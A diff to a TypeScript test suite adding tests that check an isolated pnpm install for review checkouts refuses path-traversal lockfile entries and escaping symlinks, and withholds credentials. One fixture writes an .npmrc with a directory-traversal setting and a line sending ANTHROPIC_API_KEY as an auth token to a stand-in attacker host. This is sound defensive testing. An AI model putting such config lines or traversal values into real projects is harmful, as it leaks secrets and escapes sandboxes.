@@ -1,9 +1,24 @@
 import assert from "node:assert/strict";
-import { existsSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readlinkSync, realpathSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
+import { createHash } from "node:crypto";
+import { existsSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, readlinkSync, realpathSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join, resolve } from "node:path";
 import { describe, it } from "node:test";
-import { decideDepsAction, decideSubpackageAction, ensureWorktreeDeps, findOutboundMainSymlinks, findWorkspaceEntriesIn, listWorkspacePackageMap, listWorkspaceSubpackages, repairMainNodeModules, resolveMainRepo } from "../worktree-deps.js";
+import { authoringReviewSeatPath } from "../review/seats.js";
+import {
+	decideDepsAction,
+	decideSubpackageAction,
+	ensureIsolatedSeatDeps,
+	ensureWorktreeDeps,
+	findOutboundMainSymlinks,
+	findWorkspaceEntriesIn,
+	IsolatedSeatDepsError,
+	listWorkspacePackageMap,
+	listWorkspaceSubpackages,
+	type RunnerOptions,
+	repairMainNodeModules,
+	resolveMainRepo,
+} from "../worktree-deps.js";
 
 interface Setup {
 	main: string;
@@ -1229,5 +1244,442 @@ describe("ensureWorktreeDeps main repair", () => {
 		ensureWorktreeDeps(root.worktree, root.main, { runner });
 
 		assert.deepEqual(calls, [{ cmd: "pnpm install --frozen-lockfile --ignore-scripts", cwd: root.main }]);
+	});
+});
+
+const ISOLATED_MARKER = ".pelaggio-isolated-lock";
+const ISOLATED_PACKAGE_MANAGER = "pnpm@11.18.0+sha512.33d83c77da82f49fba836925c6f1b841181ec3132b670639bd012f7075f5c7cf634c5f870147c19aae7478fac01df09d8892e880454896edd23ee9b33757563c";
+
+interface InstallCall {
+	cmd: string;
+	cwd: string;
+	options?: RunnerOptions;
+}
+
+function assertIsolatedInstallCall(call: InstallCall | undefined, cwd: string): void {
+	assert.ok(call);
+	const seatRoot = realpathSync(cwd);
+	const nodeModules = resolve(seatRoot, "node_modules");
+	const configRoot = resolve(nodeModules, ".pelaggio-pnpm-config");
+	const xdgConfig = resolve(configRoot, "xdg-config");
+	assert.equal(call.cmd, "corepack");
+	assert.equal(call.cwd, cwd);
+	assert.deepEqual(call.options?.args, [
+		ISOLATED_PACKAGE_MANAGER,
+		"--dir",
+		seatRoot,
+		"install",
+		"--frozen-lockfile",
+		"--silent",
+		"--ignore-scripts",
+		"--ignore-pnpmfile",
+		"--node-linker=isolated",
+		"--config.enable-global-virtual-store=false",
+		`--lockfile-dir=${seatRoot}`,
+		`--modules-dir=${nodeModules}`,
+		`--virtual-store-dir=${resolve(nodeModules, ".pnpm")}`,
+		`--store-dir=${resolve(nodeModules, ".pnpm-store")}`,
+		`--cache-dir=${resolve(nodeModules, ".pnpm-cache")}`,
+		`--config.state-dir=${resolve(nodeModules, ".pnpm-state")}`,
+		`--config.config-dir=${xdgConfig}`,
+		`--config.userconfig=${resolve(configRoot, "user-npmrc")}`,
+	]);
+}
+
+function lockHashOf(file: string): string {
+	return createHash("sha256").update(readFileSync(file)).digest("hex");
+}
+
+function plantPrivateSeatLayout(seat: string, markerHash?: string): void {
+	const nm = resolve(seat, "node_modules");
+	mkdirSync(join(nm, ".pnpm"), { recursive: true });
+	if (markerHash !== undefined) writeFileSync(join(nm, ISOLATED_MARKER), markerHash);
+}
+
+function isolatedSeatRecords(main: string): string[] {
+	const recordsDir = resolve(main, ".dev", "authoring-review-seat-deps");
+	try {
+		return readdirSync(recordsDir).map((entry) => resolve(recordsDir, entry));
+	} catch {
+		return [];
+	}
+}
+
+function makeSeatFixture(opts: { lock?: string; subpackages?: string[]; hostNm?: boolean } = {}): { main: string; seat: string; hostNm: string } {
+	const root = mkdtempSync(join(tmpdir(), "isolated-seat-deps-"));
+	const main = resolve(root, "main");
+	mkdirSync(main, { recursive: true });
+	const importerLines = ["importers:", "  .: {}"];
+	for (const pkg of opts.subpackages ?? []) importerLines.push(`  ${pkg}: {}`);
+	const lock = `# tag: ${opts.lock ?? "A"}\n${importerLines.join("\n")}\n`;
+	writeFileSync(join(main, "pnpm-lock.yaml"), lock);
+	const hostNm = resolve(main, "node_modules");
+	if (opts.hostNm !== false) {
+		mkdirSync(hostNm, { recursive: true });
+		writeFileSync(join(hostNm, "host-marker.txt"), "host-intact");
+	}
+	const seat = authoringReviewSeatPath(main, { sha: "abc1234", seatId: "grok", pass: 1 });
+	mkdirSync(seat, { recursive: true });
+	writeFileSync(join(seat, "pnpm-lock.yaml"), lock);
+	for (const pkg of opts.subpackages ?? []) {
+		mkdirSync(join(main, pkg), { recursive: true });
+		mkdirSync(join(seat, pkg), { recursive: true });
+	}
+	return { main, seat, hostNm };
+}
+
+function installingRunner(onInstall?: (cwd: string, options?: RunnerOptions) => void): { calls: InstallCall[]; runner: { run: (cmd: string, cwd: string, options?: RunnerOptions) => void } } {
+	const calls: InstallCall[] = [];
+	return {
+		calls,
+		runner: {
+			run: (cmd, cwd, options) => {
+				calls.push({ cmd, cwd, options });
+				onInstall?.(cwd, options);
+			},
+		},
+	};
+}
+
+describe("ensureIsolatedSeatDeps", () => {
+	it("refuses a lockfile local dependency that escapes into MAIN before accepting a reuse marker", () => {
+		const { main, seat, hostNm } = makeSeatFixture();
+		mkdirSync(join(main, "packages/pelaggio"), { recursive: true });
+		writeFileSync(join(seat, "pnpm-lock.yaml"), "importers:\n  .:\n    dependencies:\n      pelaggio:\n        specifier: workspace:*\n        version: link:../../../../packages/pelaggio\n");
+		plantPrivateSeatLayout(seat, lockHashOf(join(seat, "pnpm-lock.yaml")));
+		writeFileSync(join(seat, "node_modules", "seat-marker.txt"), "seat-intact");
+		const { calls, runner } = installingRunner();
+
+		assert.throws(
+			() => ensureIsolatedSeatDeps(seat, main, { runner }),
+			(error: unknown) => error instanceof IsolatedSeatDepsError && error.code === "unsafe-local-target",
+		);
+		assert.deepEqual(calls, []);
+		assert.equal(readFileSync(join(hostNm, "host-marker.txt"), "utf8"), "host-intact");
+		assert.equal(readFileSync(join(seat, "node_modules", "seat-marker.txt"), "utf8"), "seat-intact");
+	});
+
+	it("refuses an escaping file dependency resolution outside the importer map", () => {
+		const { main, seat } = makeSeatFixture();
+		mkdirSync(join(main, "packages/pelaggio"), { recursive: true });
+		writeFileSync(join(seat, "pnpm-lock.yaml"), "importers:\n  .: {}\npackages:\n  pelaggio@file:packages/pelaggio:\n    resolution: {directory: ../../../../packages/pelaggio, type: directory}\n");
+		const { calls, runner } = installingRunner();
+
+		assert.throws(
+			() => ensureIsolatedSeatDeps(seat, main, { runner }),
+			(error: unknown) => error instanceof IsolatedSeatDepsError && error.code === "unsafe-local-target",
+		);
+		assert.deepEqual(calls, []);
+	});
+
+	it("accepts importer-relative workspace links that remain inside the real seat", () => {
+		const { main, seat } = makeSeatFixture({ subpackages: ["packages/pelaggio", "packages/server"] });
+		writeFileSync(
+			join(seat, "pnpm-lock.yaml"),
+			"importers:\n  .:\n    dependencies:\n      pelaggio:\n        specifier: workspace:*\n        version: link:packages/pelaggio\n  packages/pelaggio: {}\n  packages/server:\n    dependencies:\n      pelaggio:\n        specifier: workspace:*\n        version: link:../pelaggio\n",
+		);
+		const { calls, runner } = installingRunner((cwd) => plantPrivateSeatLayout(cwd));
+
+		const report = ensureIsolatedSeatDeps(seat, main, { runner });
+		assert.equal(report.outcome, "installed");
+		assert.equal(calls.length, 1);
+		assertIsolatedInstallCall(calls[0], seat);
+	});
+
+	it("refuses a traversal importer before touching the seat or MAIN", () => {
+		const { main, seat, hostNm } = makeSeatFixture();
+		writeFileSync(join(seat, "pnpm-lock.yaml"), "importers:\n  .: {}\n  ../../../..: {}\n");
+		plantPrivateSeatLayout(seat);
+		writeFileSync(join(seat, "node_modules", "seat-marker.txt"), "seat-intact");
+		const { calls, runner } = installingRunner();
+
+		assert.throws(
+			() => ensureIsolatedSeatDeps(seat, main, { runner }),
+			(error: unknown) => error instanceof IsolatedSeatDepsError && error.code === "unsafe-importer",
+		);
+		assert.deepEqual(calls, []);
+		assert.equal(readFileSync(join(hostNm, "host-marker.txt"), "utf8"), "host-intact");
+		assert.equal(readFileSync(join(seat, "node_modules", "seat-marker.txt"), "utf8"), "seat-intact");
+	});
+
+	it("refuses a symlinked importer directory before touching the seat or its target", () => {
+		const { main, seat } = makeSeatFixture();
+		const outsideImporter = mkdtempSync(join(tmpdir(), "isolated-seat-importer-escape-"));
+		mkdirSync(join(outsideImporter, "node_modules"));
+		writeFileSync(join(outsideImporter, "node_modules", "outside-marker.txt"), "outside-intact");
+		writeFileSync(join(seat, "pnpm-lock.yaml"), "importers:\n  .: {}\n  packages/escape: {}\n");
+		mkdirSync(join(seat, "packages"), { recursive: true });
+		symlinkSync(outsideImporter, join(seat, "packages", "escape"), "dir");
+		plantPrivateSeatLayout(seat);
+		writeFileSync(join(seat, "node_modules", "seat-marker.txt"), "seat-intact");
+		const { calls, runner } = installingRunner();
+
+		assert.throws(
+			() => ensureIsolatedSeatDeps(seat, main, { runner }),
+			(error: unknown) => error instanceof IsolatedSeatDepsError && error.code === "unsafe-importer",
+		);
+		assert.deepEqual(calls, []);
+		assert.equal(readFileSync(join(outsideImporter, "node_modules", "outside-marker.txt"), "utf8"), "outside-intact");
+		assert.equal(readFileSync(join(seat, "node_modules", "seat-marker.txt"), "utf8"), "seat-intact");
+	});
+
+	it("accepts the repository's root and workspace importers", () => {
+		const importers = ["packages/pelaggio", "packages/server", "packages/web"];
+		const { main, seat } = makeSeatFixture({ subpackages: importers });
+		const { calls, runner } = installingRunner((cwd) => plantPrivateSeatLayout(cwd));
+
+		const report = ensureIsolatedSeatDeps(seat, main, { runner });
+		assert.equal(report.outcome, "installed");
+		assert.equal(calls.length, 1);
+		assertIsolatedInstallCall(calls[0], seat);
+	});
+
+	it("pins every install location and withholds harness credentials from checkout-controlled pnpm config", () => {
+		const { main, seat, hostNm } = makeSeatFixture();
+		writeFileSync(join(seat, ".npmrc"), `dir=../../../../..\n//attacker.invalid/:_authToken=\${ANTHROPIC_API_KEY}\n`);
+		const secret = "isolated-seat-test-secret";
+		const previous = {
+			ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY,
+			NPM_TOKEN: process.env.NPM_TOKEN,
+			NPM_CONFIG_USERCONFIG: process.env.NPM_CONFIG_USERCONFIG,
+			HTTPS_PROXY: process.env.HTTPS_PROXY,
+		};
+		process.env.ANTHROPIC_API_KEY = secret;
+		process.env.NPM_TOKEN = secret;
+		process.env.NPM_CONFIG_USERCONFIG = resolve(main, "host-npmrc");
+		process.env.HTTPS_PROXY = `https://${secret}@proxy.invalid`;
+		const { calls, runner } = installingRunner((_cwd, options) => {
+			const dirIndex = options?.args?.indexOf("--dir") ?? -1;
+			assert.notEqual(dirIndex, -1, "the absolute project selector must be a CLI argument");
+			const projectDir = options?.args?.[dirIndex + 1];
+			assert.ok(projectDir);
+			assert.equal(projectDir, realpathSync(seat));
+			plantPrivateSeatLayout(projectDir);
+		});
+
+		try {
+			const report = ensureIsolatedSeatDeps(seat, main, { runner });
+			assert.equal(report.outcome, "installed");
+		} finally {
+			for (const [name, value] of Object.entries(previous)) {
+				if (value === undefined) delete process.env[name];
+				else process.env[name] = value;
+			}
+		}
+
+		assert.equal(calls.length, 1);
+		assertIsolatedInstallCall(calls[0], seat);
+		const env = calls[0]?.options?.env;
+		assert.ok(env);
+		assert.equal(env.ANTHROPIC_API_KEY, undefined);
+		assert.equal(env.NPM_TOKEN, undefined);
+		assert.equal(env.HTTPS_PROXY, undefined);
+		assert.ok(!Object.values(env).some((value) => value?.includes(secret)));
+		const configRoot = resolve(realpathSync(seat), "node_modules", ".pelaggio-pnpm-config");
+		assert.equal(env.HOME, configRoot);
+		assert.equal(env.NPM_CONFIG_USERCONFIG, resolve(configRoot, "user-npmrc"));
+		assert.equal(env.COREPACK_HOME, resolve(configRoot, "corepack"));
+		assert.equal(env.COREPACK_ENV_FILE, "0");
+		assert.equal(readFileSync(env.NPM_CONFIG_USERCONFIG, "utf8"), "");
+		assert.equal(readFileSync(join(hostNm, "host-marker.txt"), "utf8"), "host-intact");
+	});
+
+	it("does not trust a matching reuse marker inside the reviewed checkout", () => {
+		const { main, seat } = makeSeatFixture();
+		const lockHash = lockHashOf(join(seat, "pnpm-lock.yaml"));
+		plantPrivateSeatLayout(seat, lockHash);
+		const { calls, runner } = installingRunner((cwd) => plantPrivateSeatLayout(cwd));
+
+		const report = ensureIsolatedSeatDeps(seat, main, { runner });
+
+		assert.equal(report.outcome, "installed");
+		assert.equal(calls.length, 1);
+		assert.equal(existsSync(join(seat, "node_modules", ISOLATED_MARKER)), false);
+		const records = isolatedSeatRecords(main);
+		assert.equal(records.length, 1);
+		assert.ok(!(records[0] as string).startsWith(`${seat}/`));
+	});
+
+	it("reuses a private layout bound to the current lockfile", () => {
+		const { main, seat } = makeSeatFixture();
+		const { calls, runner } = installingRunner((cwd) => plantPrivateSeatLayout(cwd));
+		const first = ensureIsolatedSeatDeps(seat, main, { runner });
+		assert.equal(first.outcome, "installed");
+		assert.equal(first.lockHash, lockHashOf(join(seat, "pnpm-lock.yaml")));
+		assert.equal(calls.length, 1);
+		assertIsolatedInstallCall(calls[0], seat);
+		assert.equal(existsSync(join(seat, "node_modules", ISOLATED_MARKER)), false);
+		const records = isolatedSeatRecords(main);
+		assert.equal(records.length, 1);
+		assert.equal(JSON.parse(readFileSync(records[0] as string, "utf8")).lockHash, first.lockHash);
+
+		const second = ensureIsolatedSeatDeps(seat, main, { runner });
+		assert.equal(second.outcome, "reused");
+		assert.equal(second.lockHash, first.lockHash);
+		assert.equal(calls.length, 1, "matching marker must not reinstall");
+	});
+
+	it("reprovisions a marker-matched layout whose dependency symlink escapes the seat", () => {
+		const { main, seat, hostNm } = makeSeatFixture();
+		mkdirSync(join(main, "packages/pelaggio"), { recursive: true });
+		plantPrivateSeatLayout(seat, lockHashOf(join(seat, "pnpm-lock.yaml")));
+		symlinkSync(join(main, "packages/pelaggio"), join(seat, "node_modules", "pelaggio"), "dir");
+		const { calls, runner } = installingRunner((cwd) => plantPrivateSeatLayout(cwd));
+
+		const report = ensureIsolatedSeatDeps(seat, main, { runner });
+		assert.equal(report.outcome, "installed");
+		assert.equal(calls.length, 1);
+		assertIsolatedInstallCall(calls[0], seat);
+		assert.equal(existsSync(join(seat, "node_modules", "pelaggio")), false);
+		assert.ok(existsSync(join(hostNm, "host-marker.txt")));
+	});
+
+	it("reprovisions when the lockfile drifts", () => {
+		const { main, seat } = makeSeatFixture({ lock: "A" });
+		const { calls, runner } = installingRunner((cwd) => plantPrivateSeatLayout(cwd));
+		ensureIsolatedSeatDeps(seat, main, { runner });
+		writeFileSync(join(seat, "pnpm-lock.yaml"), "# tag: B\nimporters:\n  .: {}\n");
+		const drifted = ensureIsolatedSeatDeps(seat, main, { runner });
+		assert.equal(drifted.outcome, "installed");
+		assert.equal(calls.length, 2);
+		const records = isolatedSeatRecords(main);
+		assert.equal(records.length, 1);
+		assert.equal(JSON.parse(readFileSync(records[0] as string, "utf8")).lockHash, lockHashOf(join(seat, "pnpm-lock.yaml")));
+	});
+
+	it("rejects a whole-dir symlink layer without following it into MAIN", () => {
+		const { main, seat, hostNm } = makeSeatFixture({ subpackages: ["packages/a"] });
+		mkdirSync(join(main, "packages/a/node_modules"), { recursive: true });
+		writeFileSync(join(main, "packages/a/node_modules", "keep.txt"), "main-importer");
+		plantPrivateSeatLayout(seat, lockHashOf(join(seat, "pnpm-lock.yaml")));
+		const importerNm = join(seat, "packages/a/node_modules");
+		symlinkSync(join(main, "packages/a/node_modules"), importerNm, "dir");
+
+		const { calls, runner } = installingRunner((cwd) => {
+			plantPrivateSeatLayout(cwd);
+			mkdirSync(join(cwd, "packages/a"), { recursive: true });
+		});
+		const report = ensureIsolatedSeatDeps(seat, main, { runner });
+		assert.equal(report.outcome, "installed");
+		assert.equal(calls.length, 1);
+		assert.equal(existsSync(importerNm), false, "importer symlink unlinked, not followed");
+		assert.ok(existsSync(join(main, "packages/a/node_modules", "keep.txt")), "MAIN importer tree must survive");
+		assert.ok(existsSync(join(hostNm, "host-marker.txt")));
+	});
+
+	it("fails closed when the install runner throws", () => {
+		const { main, seat } = makeSeatFixture();
+		assert.throws(
+			() =>
+				ensureIsolatedSeatDeps(seat, main, {
+					runner: {
+						run: () => {
+							throw new Error("pnpm exploded");
+						},
+					},
+				}),
+			/pnpm install failed/,
+		);
+		assert.equal(existsSync(join(seat, "node_modules", ISOLATED_MARKER)), false);
+		assert.deepEqual(isolatedSeatRecords(main), []);
+	});
+
+	it("fails closed when the postcondition is not met after install", () => {
+		const { main, seat } = makeSeatFixture();
+		assert.throws(
+			() =>
+				ensureIsolatedSeatDeps(seat, main, {
+					runner: {
+						run: (cmd, cwd, options) => {
+							assertIsolatedInstallCall({ cmd, cwd, options }, seat);
+							mkdirSync(join(cwd, "node_modules"), { recursive: true });
+						},
+					},
+				}),
+			/postcondition failed/,
+		);
+		assert.equal(existsSync(join(seat, "node_modules", ISOLATED_MARKER)), false);
+		assert.deepEqual(isolatedSeatRecords(main), []);
+	});
+
+	it("fails closed when a fresh install creates a dependency symlink outside the seat", () => {
+		const { main, seat } = makeSeatFixture();
+		mkdirSync(join(main, "packages/pelaggio"), { recursive: true });
+
+		assert.throws(
+			() =>
+				ensureIsolatedSeatDeps(seat, main, {
+					runner: {
+						run: (_cmd, cwd) => {
+							plantPrivateSeatLayout(cwd);
+							symlinkSync(join(main, "packages/pelaggio"), join(cwd, "node_modules", "pelaggio"), "dir");
+						},
+					},
+				}),
+			(error: unknown) => error instanceof IsolatedSeatDepsError && error.code === "invalid-layout",
+		);
+		assert.equal(existsSync(join(seat, "node_modules", ISOLATED_MARKER)), false);
+	});
+
+	it("refuses to operate off a non-seat path", () => {
+		const { main, worktree } = makeSetup({ mainLock: "A", worktreeLock: "A", mainNm: "dir", worktreeNm: null });
+		assert.throws(() => ensureIsolatedSeatDeps(worktree, main, { runner: { run: () => {} } }), /not under/);
+		assert.equal(existsSync(resolve(worktree, "node_modules")), false);
+	});
+});
+
+describe("ensureWorktreeDeps isolated seats", () => {
+	it("recognizes an isolated seat through a symlinked MAIN path", () => {
+		const { main, seat } = makeSeatFixture();
+		const mainAlias = resolve(main, "..", "main-alias");
+		symlinkSync(main, mainAlias, "dir");
+		const seatViaAlias = authoringReviewSeatPath(mainAlias, { sha: "abc1234", seatId: "grok", pass: 1 });
+		assert.equal(realpathSync(seatViaAlias), realpathSync(seat));
+		const { calls, runner } = installingRunner((cwd) => plantPrivateSeatLayout(cwd));
+
+		const report = ensureWorktreeDeps(seatViaAlias, mainAlias, { runner });
+		assert.equal(report.root.type, "isolated");
+		assert.equal(calls.length, 1);
+		assertIsolatedInstallCall(calls[0], seatViaAlias);
+	});
+
+	it("returns isolated (not materialize/restore/link) for an authoringReviewSeatPath and does not rewrite host links", () => {
+		const { main, seat, hostNm } = makeSeatFixture();
+		const { calls, runner } = installingRunner((cwd) => plantPrivateSeatLayout(cwd));
+
+		const first = ensureWorktreeDeps(seat, main, { runner });
+		assert.equal(first.root.type, "isolated");
+		assert.deepEqual(first.subpackages, []);
+		assert.equal(calls.length, 1);
+		assertIsolatedInstallCall(calls[0], seat);
+		assert.ok(lstatSync(join(seat, "node_modules")).isDirectory());
+		assert.equal(lstatSync(join(seat, "node_modules")).isSymbolicLink(), false);
+		assert.ok(existsSync(join(hostNm, "host-marker.txt")));
+
+		const second = ensureWorktreeDeps(seat, main, { runner });
+		assert.equal(second.root.type, "isolated");
+		assert.equal(calls.length, 1, "second call must reuse, not shared-mode restore/link");
+		assert.ok(existsSync(join(hostNm, "host-marker.txt")));
+		assert.equal(lstatSync(hostNm).isSymbolicLink(), false);
+	});
+
+	it("does not take MAIN's repair path for an isolated seat", () => {
+		const { main, seat } = makeSeatFixture();
+		symlinkSync("../../sibling/node_modules/.pnpm/tsx@4.21.0/node_modules/tsx", join(main, "node_modules", "tsx"), "dir");
+		const { calls, runner } = installingRunner((cwd) => plantPrivateSeatLayout(cwd));
+		const report = ensureWorktreeDeps(seat, main, { runner });
+		assert.equal(report.root.type, "isolated");
+		assert.ok(!calls.some((c) => c.cwd === main), "isolated provision must not repair MAIN");
+		assert.equal(calls.length, 1);
+		assertIsolatedInstallCall(calls[0], seat);
+	});
+
+	it("still returns skip-read-only for a seat path before isolated provision", () => {
+		const { main, seat } = makeSeatFixture();
+		const { calls, runner } = installingRunner((cwd) => plantPrivateSeatLayout(cwd));
+		const report = ensureWorktreeDeps(seat, main, { runner, workspaceAccess: "read-only" });
+		assert.deepEqual(report, { root: { type: "skip-read-only" }, subpackages: [] });
+		assert.deepEqual(calls, []);
+		assert.equal(existsSync(join(seat, "node_modules")), false);
 	});
 });
